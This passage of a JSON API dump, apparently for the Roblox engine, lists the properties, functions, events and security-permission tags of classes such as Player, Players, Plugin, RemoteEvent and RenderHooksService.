Neutral","tags":[],"Class":"Player"},{"ValueType":"int","type":"Property","Name":"PersonalServerRank","tags":["RobloxScriptSecurity"],"Class":"Player"},{"ValueType":"Object","type":"Property","Name":"RespawnLocation","tags":[],"Class":"Player"},{"ValueType":"float","type":"Property","Name":"SimulationRadius","tags":["LocalUserSecurity"],"Class":"Player"},{"ValueType":"BrickColor","type":"Property","Name":"TeamColor","tags":[],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"Teleported","tags":["RobloxScriptSecurity","hidden","readonly"],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"TeleportedIn","tags":["RobloxScriptSecurity"],"Class":"Player"},{"ValueType":"int","type":"Property","Name":"UserId","tags":[],"Class":"Player"},{"ValueType":"string","type":"Property","Name":"VRDevice","tags":["RobloxScriptSecurity"],"Class":"Player"},{"ValueType":"int","type":"Property","Name":"userId","tags":["deprecated"],"Class":"Player"},{"ReturnType":"void","Arguments":[],"Name":"ClearCharacterAppearance","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"float","Arguments":[{"Type":"Vector3","Name":"point","Default":null}],"Name":"DistanceFromCharacter","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"FriendStatus","Arguments":[{"Type":"Instance","Name":"player","Default":null}],"Name":"GetFriendStatus","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"GetGameSessionID","tags":["RobloxSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetMouse","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"GetUnder13","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"HasAppearanceLoaded","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"JumpCharacter","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":""}],"Name":"Kick","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"LoadBoolean","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"inGame","Default":"true"}],"Name":"LoadCharacter","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"assetInstance","Default":null}],"Name":"LoadCharacterAppearance","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"LoadData","tags":["LocalUserSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"LoadInstance","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"double","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"LoadNumber","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"LoadString","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"walkDirection","Default":null},{"Type":"bool","Name":"relativeToCamera","Default":"false"}],"Name":"Move","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"walkDirection","Default":null},{"Type":"float","Name":"maxWalkDelta","Default":null}],"Name":"MoveCharacter","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"RemoveCharacter","tags":["LocalUserSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null}],"Name":"RequestFriendship","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null}],"Name":"RevokeFriendship","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"bool","Name":"value","Default":null}],"Name":"SaveBoolean","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"SaveData","tags":["LocalUserSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"Instance","Name":"value","Default":null}],"Name":"SaveInstance","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"SaveLeaderboardData","tags":["LocalUserSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"double","Name":"value","Default":null}],"Name":"SaveNumber","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"string","Name":"value","Default":null}],"Name":"SaveString","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"accountAge","Default":null}],"Name":"SetAccountAge","tags":["PluginSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"MembershipType","Name":"membershipType","Default":null}],"Name":"SetMembershipType","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"value","Default":null}],"Name":"SetSuperSafeChat","tags":["PluginSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"value","Default":null}],"Name":"SetUnder13","tags":["RobloxSecurity","deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"loadBoolean","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"loadInstance","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"double","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"loadNumber","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"loadString","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"bool","Name":"value","Default":null}],"Name":"saveBoolean","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"Instance","Name":"value","Default":null}],"Name":"saveInstance","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"double","Name":"value","Default":null}],"Name":"saveNumber","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"string","Name":"value","Default":null}],"Name":"saveString","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"Array","Arguments":[{"Type":"int","Name":"maxFriends","Default":"200"}],"Name":"GetFriendsOnline","tags":[],"Class":"Player","type":"YieldFunction"},{"ReturnType":"int","Arguments":[{"Type":"int","Name":"groupId","Default":null}],"Name":"GetRankInGroup","tags":[],"Class":"Player","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"groupId","Default":null}],"Name":"GetRoleInGroup","tags":[],"Class":"Player","type":"YieldFunction"},{"ReturnType":"string","Arguments":[],"Name":"GetWebPersonalServerRank","tags":["LocalUserSecurity","backend"],"Class":"Player","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"IsBestFriendsWith","tags":["deprecated"],"Class":"Player","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"IsFriendsWith","tags":[],"Class":"Player","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"groupId","Default":null}],"Name":"IsInGroup","tags":[],"Class":"Player","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"rank","Default":null}],"Name":"SetWebPersonalServerRank","tags":["WritePlayerSecurity"],"Class":"Player","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[],"Name":"WaitForDataReady","tags":[],"Class":"Player","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"isFriendsWith","tags":["deprecated"],"Class":"Player","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[],"Name":"waitForDataReady","tags":["deprecated"],"Class":"Player","type":"YieldFunction"},{"Arguments":[{"Name":"character","Type":"Instance"}],"Name":"CharacterAdded","tags":[],"Class":"Player","type":"Event"},{"Arguments":[{"Name":"character","Type":"Instance"}],"Name":"CharacterAppearanceLoaded","tags":[],"Class":"Player","type":"Event"},{"Arguments":[{"Name":"character","Type":"Instance"}],"Name":"CharacterRemoving","tags":[],"Class":"Player","type":"Event"},{"Arguments":[{"Name":"message","Type":"string"},{"Name":"recipient","Type":"Instance"}],"Name":"Chatted","tags":[],"Class":"Player","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"friendStatus","Type":"FriendStatus"}],"Name":"FriendStatusChanged","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Event"},{"Arguments":[{"Name":"time","Type":"double"}],"Name":"Idled","tags":[],"Class":"Player","type":"Event"},{"Arguments":[{"Name":"teleportState","Type":"TeleportState"},{"Name":"placeId","Type":"int"},{"Name":"spawnName","Type":"string"}],"Name":"OnTeleport","tags":[],"Class":"Player","type":"Event"},{"Arguments":[{"Name":"radius","Type":"float"}],"Name":"SimulationRadiusChanged","tags":["LocalUserSecurity"],"Class":"Player","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"PlayerScripts","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"Players","tags":[]},{"ValueType":"bool","type":"Property","Name":"BubbleChat","tags":["readonly"],"Class":"Players"},{"ValueType":"bool","type":"Property","Name":"CharacterAutoLoads","tags":[],"Class":"Players"},{"ValueType":"bool","type":"Property","Name":"ClassicChat","tags":["readonly"],"Class":"Players"},{"ValueType":"Object","type":"Property","Name":"LocalPlayer","tags":["readonly"],"Class":"Players"},{"ValueType":"int","type":"Property","Name":"MaxPlayers","tags":["readonly"],"Class":"Players"},{"ValueType":"int","type":"Property","Name":"MaxPlayersInternal","tags":["LocalUserSecurity"],"Class":"Players"},{"ValueType":"int","type":"Property","Name":"NumPlayers","tags":["readonly"],"Class":"Players"},{"ValueType":"int","type":"Property","Name":"PreferredPlayers","tags":["readonly"],"Class":"Players"},{"ValueType":"int","type":"Property","Name":"PreferredPlayersInternal","tags":["LocalUserSecurity"],"Class":"Players"},{"ValueType":"Object","type":"Property","Name":"localPlayer","tags":["deprecated","hidden","readonly"],"Class":"Players"},{"ValueType":"int","type":"Property","Name":"numPlayers","tags":["deprecated","hidden","readonly"],"Class":"Players"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"AddLeaderboardKey","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":null}],"Name":"Chat","tags":["PluginSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"bool","Name":"isTeleport","Default":"false"}],"Name":"CreateLocalPlayer","tags":["PluginSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"userID","Default":null}],"Name":"GetPlayerByID","tags":["LocalUserSecurity","deprecated"],"Class":"Players","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetPlayerById","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetPlayerByUserId","tags":[],"Class":"Players","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"character","Default":null}],"Name":"GetPlayerFromCharacter","tags":[],"Class":"Players","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetPlayers","tags":[],"Class":"Players","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"GetUseCoreScriptHealthBar","tags":["RobloxScriptSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"string","Name":"reason","Default":null},{"Type":"string","Name":"optionalMessage","Default":null}],"Name":"ReportAbuse","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetAbuseReportUrl","tags":["RobloxSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetBuildUserPermissionsUrl","tags":["RobloxSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetChatFilterUrl","tags":["RobloxSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"ChatStyle","Name":"style","Default":"Classic"}],"Name":"SetChatStyle","tags":["PluginSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetLoadDataUrl","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetSaveDataUrl","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetSaveLeaderboardDataUrl","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetSysStatsUrl","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"urlId","Default":null}],"Name":"SetSysStatsUrlId","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":null}],"Name":"TeamChat","tags":["PluginSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":null},{"Type":"Instance","Name":"player","Default":null}],"Name":"WhisperChat","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"character","Default":null}],"Name":"getPlayerFromCharacter","tags":["deprecated"],"Class":"Players","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"getPlayers","tags":["deprecated"],"Class":"Players","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"character","Default":null}],"Name":"playerFromCharacter","tags":["deprecated"],"Class":"Players","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"players","tags":["deprecated"],"Class":"Players","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"blockerUserId","Default":null},{"Type":"int","Name":"blockeeUserId","Default":null}],"Name":"BlockUser","tags":["RobloxScriptSecurity"],"Class":"Players","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetCharacterAppearanceAsync","tags":[],"Class":"Players","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetFriendsAsync","tags":[],"Class":"Players","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetNameFromUserIdAsync","tags":[],"Class":"Players","type":"YieldFunction"},{"ReturnType":"int","Arguments":[{"Type":"string","Name":"userName","Default":null}],"Name":"GetUserIdFromNameAsync","tags":[],"Class":"Players","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"exblockerUserId","Default":null},{"Type":"int","Name":"exblockeeUserId","Default":null}],"Name":"UnblockUser","tags":["RobloxScriptSecurity"],"Class":"Players","type":"YieldFunction"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"player","Type":"Instance"},{"Name":"friendRequestEvent","Type":"FriendRequestEvent"}],"Name":"FriendRequestEvent","tags":["RobloxScriptSecurity"],"Class":"Players","type":"Event"},{"Arguments":[{"Name":"message","Type":"string"}],"Name":"GameAnnounce","tags":["RobloxScriptSecurity"],"Class":"Players","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"}],"Name":"PlayerAdded","tags":[],"Class":"Players","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"}],"Name":"PlayerAddedEarly","tags":["LocalUserSecurity"],"Class":"Players","type":"Event"},{"Arguments":[{"Name":"chatType","Type":"PlayerChatType"},{"Name":"player","Type":"Instance"},{"Name":"message","Type":"string"},{"Name":"targetPlayer","Type":"Instance"}],"Name":"PlayerChatted","tags":["LocalUserSecurity"],"Class":"Players","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"}],"Name":"PlayerRemoving","tags":[],"Class":"Players","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"}],"Name":"PlayerRemovingLate","tags":["LocalUserSecurity"],"Class":"Players","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Plugin","tags":[]},{"ValueType":"bool","type":"Property","Name":"CollisionEnabled","tags":["readonly"],"Class":"Plugin"},{"ValueType":"float","type":"Property","Name":"GridSize","tags":["readonly"],"Class":"Plugin"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"exclusiveMouse","Default":null}],"Name":"Activate","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"name","Default":null}],"Name":"CreateToolbar","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"JointCreationMode","Arguments":[],"Name":"GetJoinMode","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetMouse","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"Variant","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"GetSetting","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"int","Arguments":[],"Name":"GetStudioUserId","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"Objects","Arguments":[{"Type":"Objects","Name":"objects","Default":null}],"Name":"Negate","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"script","Default":null},{"Type":"int","Name":"lineNumber","Default":"0"}],"Name":"OpenScript","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"OpenWikiPage","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"SaveSelectedToRoblox","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"Objects","Arguments":[{"Type":"Objects","Name":"objects","Default":null}],"Name":"Separate","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"Variant","Name":"value","Default":null}],"Name":"SetSetting","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Objects","Name":"objects","Default":null}],"Name":"Union","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"int","Arguments":[{"Type":"string","Name":"assetType","Default":null}],"Name":"PromptForExistingAssetId","tags":["PluginSecurity"],"Class":"Plugin","type":"YieldFunction"},{"Arguments":[],"Name":"Deactivation","tags":["PluginSecurity"],"Class":"Plugin","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"PluginManager","tags":[]},{"ReturnType":"Instance","Arguments":[],"Name":"CreatePlugin","tags":["PluginSecurity"],"Class":"PluginManager","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"filePath","Default":""}],"Name":"ExportPlace","tags":["PluginSecurity"],"Class":"PluginManager","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"filePath","Default":""}],"Name":"ExportSelection","tags":["PluginSecurity"],"Class":"PluginManager","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"PointsService","tags":["notCreatable"]},{"ReturnType":"int","Arguments":[],"Name":"GetAwardablePoints","tags":["deprecated"],"Class":"PointsService","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"int","Name":"amount","Default":null}],"Name":"AwardPoints","tags":[],"Class":"PointsService","type":"YieldFunction"},{"ReturnType":"int","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetGamePointBalance","tags":[],"Class":"PointsService","type":"YieldFunction"},{"ReturnType":"int","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetPointBalance","tags":["deprecated"],"Class":"PointsService","type":"YieldFunction"},{"Arguments":[{"Name":"userId","Type":"int"},{"Name":"pointsAwarded","Type":"int"},{"Name":"userBalanceInGame","Type":"int"},{"Name":"userTotalBalance","Type":"int"}],"Name":"PointsAwarded","tags":[],"Class":"PointsService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Pose","tags":[]},{"ValueType":"CoordinateFrame","type":"Property","Name":"CFrame","tags":[],"Class":"Pose"},{"ValueType":"PoseEasingDirection","type":"Property","Name":"EasingDirection","tags":[],"Class":"Pose"},{"ValueType":"PoseEasingStyle","type":"Property","Name":"EasingStyle","tags":[],"Class":"Pose"},{"ValueType":"float","type":"Property","Name":"MaskWeight","tags":[],"Class":"Pose"},{"ValueType":"float","type":"Property","Name":"Weight","tags":[],"Class":"Pose"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"pose","Default":null}],"Name":"AddSubPose","tags":[],"Class":"Pose","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetSubPoses","tags":[],"Class":"Pose","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"pose","Default":null}],"Name":"RemoveSubPose","tags":[],"Class":"Pose","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"PostEffect","tags":[]},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"PostEffect"},{"Superclass":"PostEffect","type":"Class","Name":"BloomEffect","tags":[]},{"ValueType":"float","type":"Property","Name":"Intensity","tags":[],"Class":"BloomEffect"},{"ValueType":"float","type":"Property","Name":"Size","tags":[],"Class":"BloomEffect"},{"ValueType":"float","type":"Property","Name":"Threshold","tags":[],"Class":"BloomEffect"},{"Superclass":"PostEffect","type":"Class","Name":"BlurEffect","tags":[]},{"ValueType":"float","type":"Property","Name":"Size","tags":[],"Class":"BlurEffect"},{"Superclass":"PostEffect","type":"Class","Name":"ColorCorrectionEffect","tags":[]},{"ValueType":"float","type":"Property","Name":"Brightness","tags":[],"Class":"ColorCorrectionEffect"},{"ValueType":"float","type":"Property","Name":"Contrast","tags":[],"Class":"ColorCorrectionEffect"},{"ValueType":"float","type":"Property","Name":"Saturation","tags":[],"Class":"ColorCorrectionEffect"},{"ValueType":"Color3","type":"Property","Name":"TintColor","tags":[],"Class":"ColorCorrectionEffect"},{"Superclass":"PostEffect","type":"Class","Name":"SunRaysEffect","tags":[]},{"ValueType":"float","type":"Property","Name":"Intensity","tags":[],"Class":"SunRaysEffect"},{"ValueType":"float","type":"Property","Name":"Spread","tags":[],"Class":"SunRaysEffect"},{"Superclass":"Instance","type":"Class","Name":"RayValue","tags":[]},{"ValueType":"Ray","type":"Property","Name":"Value","tags":[],"Class":"RayValue"},{"Arguments":[{"Name":"value","Type":"Ray"}],"Name":"Changed","tags":[],"Class":"RayValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"Ray"}],"Name":"changed","tags":["deprecated"],"Class":"RayValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadata","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataCallbacks","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataClasses","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataEnums","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataEvents","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataFunctions","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataItem","tags":[]},{"ValueType":"bool","type":"Property","Name":"Browsable","tags":[],"Class":"ReflectionMetadataItem"},{"ValueType":"bool","type":"Property","Name":"Deprecated","tags":[],"Class":"ReflectionMetadataItem"},{"ValueType":"bool","type":"Property","Name":"IsBackend","tags":[],"Class":"ReflectionMetadataItem"},{"ValueType":"double","type":"Property","Name":"UIMaximum","tags":[],"Class":"ReflectionMetadataItem"},{"ValueType":"double","type":"Property","Name":"UIMinimum","tags":[],"Class":"ReflectionMetadataItem"},{"ValueType":"string","type":"Property","Name":"summary","tags":[],"Class":"ReflectionMetadataItem"},{"Superclass":"ReflectionMetadataItem","type":"Class","Name":"ReflectionMetadataClass","tags":[]},{"ValueType":"int","type":"Property","Name":"ExplorerImageIndex","tags":[],"Class":"ReflectionMetadataClass"},{"ValueType":"int","type":"Property","Name":"ExplorerOrder","tags":[],"Class":"ReflectionMetadataClass"},{"ValueType":"bool","type":"Property","Name":"Insertable","tags":[],"Class":"ReflectionMetadataClass"},{"ValueType":"string","type":"Property","Name":"PreferredParent","tags":[],"Class":"ReflectionMetadataClass"},{"Superclass":"ReflectionMetadataItem","type":"Class","Name":"ReflectionMetadataEnum","tags":[]},{"Superclass":"ReflectionMetadataItem","type":"Class","Name":"ReflectionMetadataEnumItem","tags":[]},{"Superclass":"ReflectionMetadataItem","type":"Class","Name":"ReflectionMetadataMember","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataProperties","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataYieldFunctions","tags":[]},{"Superclass":"Instance","type":"Class","Name":"RemoteEvent","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"Tuple","Name":"arguments","Default":null}],"Name":"FireAllClients","tags":[],"Class":"RemoteEvent","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"Tuple","Name":"arguments","Default":null}],"Name":"FireClient","tags":[],"Class":"RemoteEvent","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Tuple","Name":"arguments","Default":null}],"Name":"FireServer","tags":[],"Class":"RemoteEvent","type":"Function"},{"Arguments":[{"Name":"arguments","Type":"Tuple"}],"Name":"OnClientEvent","tags":[],"Class":"RemoteEvent","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"arguments","Type":"Tuple"}],"Name":"OnServerEvent","tags":[],"Class":"RemoteEvent","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"RemoteFunction","tags":[]},{"ReturnType":"Tuple","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"Tuple","Name":"arguments","Default":null}],"Name":"InvokeClient","tags":[],"Class":"RemoteFunction","type":"YieldFunction"},{"ReturnType":"Tuple","Arguments":[{"Type":"Tuple","Name":"arguments","Default":null}],"Name":"InvokeServer","tags":[],"Class":"RemoteFunction","type":"YieldFunction"},{"ReturnType":"Tuple","Arguments":[{"Name":"arguments","Type":"Tuple"}],"Name":"OnClientInvoke","tags":[],"Class":"RemoteFunction","type":"Callback"},{"ReturnType":"Tuple","Arguments":[{"Name":"player","Type":"Instance"},{"Name":"arguments","Type":"Tuple"}],"Name":"OnServerInvoke","tags":[],"Class":"RemoteFunction","type":"Callback"},{"Superclass":"Instance","type":"Class","Name":"RenderHooksService","tags":[]},{"ReturnType":"void","Arguments":[],"Name":"CaptureMetrics","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"qId","Default":null}],"Name":"DisableQueue","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"enabled","Default":null}],"Name":"EnableAdorns","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"qId","Default":null}],"Name":"EnableQueue","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"GetDeltaAve","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"GetGPUDelay","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"GetPresentTime","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"GetRenderAve","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"GetRenderConfMax","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"GetRenderConfMin","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"GetRenderStd","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"PrintScene","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ReloadShaders","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"width","Default":null},{"Type":"int","Name":"height","Default":null}],"Name":"ResizeWindow","t